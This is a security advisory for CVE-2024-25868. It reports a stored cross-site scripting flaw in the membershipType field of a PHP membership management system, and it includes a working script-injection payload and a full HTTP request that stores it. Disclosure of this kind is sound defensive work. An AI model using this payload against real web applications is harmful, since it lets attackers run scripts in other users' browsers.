# Membership Management System in PHP - Stored Cross-Site Scripting (Add Membership Type)

### CVE Assigned:
**[CVE-2024-25868](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25868)** [mitre.org](https://www.cve.org/CVERecord?id=CVE-2024-25868) [nvd.nist.org](https://nvd.nist.gov/vuln/detail/CVE-2024-25868)

### Date:

> 9 Feb 2024

### Author Email:

> yevhenii.butenko@outlook.com

### Vendor Homepage:

> https://codeastro.com/

### Software Link:

> [Membership Management System in PHP](https://codeastro.com/membership-management-system-in-php-with-source-code/)

### Version:

> v 1.0

### Stored Cross-Site Scripting (XSS):

> Stored Cross-Site Scripting (XSS) is a web security vulnerability where an attacker injects malicious scripts into a web application's database. The malicious script is saved on the server and later rendered in other users' browsers. When other users access the affected page, the stored script executes, potentially stealing data or compromising user security.

### Affected Components:

> add_type.php

> `membershipType` parameter within the Add Membership Type mechanism is vulnerable to Stored Cross-Site Scripting.

### Description:

> `membershipType` parameter within `Add Membership Type` request is vulnerable to Stored Cross-Site Scripting. The application failed to sanitize user input while storing it to the database and reflecting back on the page.

## Proof of Concept:

The following payload `"><script>alert("membership type XSS")</script>` can be used in order to exploit the vulnerability.

Below is an example of a request demonstrating how a malicious payload can be stored within the `membershipType` value:

```
POST /MembershipM-PHP/add_type.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Origin: http://localhost
Connection: close
Referer: http://localhost/MembershipM-PHP/add_type.php
Cookie: PHPSESSID=u196ge5gig0huui03bvl183mee
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

membershipType=%22%3E%3Cscript%3Ealert%28%22membership+type+XSS%22%29%3C%2Fscript%3E&membershipAmount=1
```

The XSS will be triggered in all locations where the Membership Type value is displayed within the application. Below is an example demonstrating the execution of the payload on the `add_members.php` page:

![XSS Fired](https://github.com/0xQRx/VulnerabilityResearch/blob/master/2024/img/membership_management_add_type_xss.png?raw=true)

## Recommendations

When using this Membership Management System, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.
